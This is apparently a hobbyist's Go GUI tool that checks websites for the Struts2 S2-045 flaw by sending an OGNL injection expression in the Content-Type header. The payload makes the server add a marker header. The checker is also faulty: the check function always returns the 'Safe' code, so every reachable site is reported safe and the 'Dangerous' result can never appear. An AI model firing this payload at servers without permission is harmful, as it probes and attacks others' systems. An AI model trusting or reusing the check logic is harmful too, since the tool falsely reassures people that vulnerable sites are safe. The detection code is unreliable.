//Struts2-045-checker
//检测是否含有Struts2-045漏洞的小东西
//
//作者：labrusca
//邮箱：labrusca@live.com
//version:0.1.0
//许可证：GPLv3
package main

import (
	"fmt"
	"net/http"
	"regexp"
	"github.com/andlabs/ui"
)


func main() {
    err := ui.Main(func() {
        website := ui.NewEntry()
        button := ui.NewButton("launch!")
        rls := ui.NewLabel("")
        box := ui.NewVerticalBox()
        box.Append(ui.NewLabel("Enter website to check:"), false)
        box.Append(website, false)
        box.Append(button, false)
        box.Append(rls, false)
        window := ui.NewWindow("Struts2-045-checker", 300, 150, false)
        window.SetChild(box)
        button.OnClicked(func(*ui.Button) {
        	checkrls := Has_st(website.Text())
        	switch checkrls{
        		case 1:
        			rls.SetText("Safe! (^_^)")
        		case 0:
        			rls.SetText("Dangerous!(>_<)")
        		case -1:
        			rls.SetText("Something Error!")
        		case -2:
        			rls.SetText("Hey,Maybe you forget to add \"http://\" or \"https://\"?")
        	}
        })
        window.OnClosing(func(*ui.Window) bool {
            ui.Quit()
            return true
        })
        window.Show()
    })
    if err != nil {
        panic(err)
    }
}

func Has_st(address string) int{
	re, uerr := regexp.MatchString(`(http[s]?):[//](w{3}\.)?[a-zA-z0-9\/%?:=+.]*\.[a-zA-z0-9\/%?:=+.]{2,6}\b([a-zA-z0-9\/%?:=+.])*`, address)
	if uerr != nil {
		fmt.Println(uerr.Error())
	}
	if re {
		client := &http.Client{}
		req, nerr := http.NewRequest("GET",address, nil)
		if nerr != nil{
			fmt.Println(nerr.Error())
			return -1
		}
		req.Header.Add("User-Agent","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36")
		req.Header.Add("infomation","Just for pentest|By Struts2-045-checker.go")
		req.Header.Add("Athor","I'm labrusca.I do not use this 2 hack any site,if happened,not me!")
		req.Header.Add("Content-Type","%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vul','vul')}.multipart/form-data")
		resp, cerr := client.Do(req)
		if cerr != nil{
			fmt.Println(cerr.Error())
			return -1
		}
		defer resp.Body.Close()
		//content, err := ioutil.ReadAll(resp.Body)
		//fmt.Println(string(content))
		fmt.Printf("%s %s\n",resp.Header["Vul"],address)
		//fmt.Println(strings.Contains(string(resp.Header["Vul"]), "vul"))
		return 1
	} else {
		return -2
	}
	return 0

}

func Done(num int,c chan int) {
	for ;num!=0;num-- {
		<- c
	}
}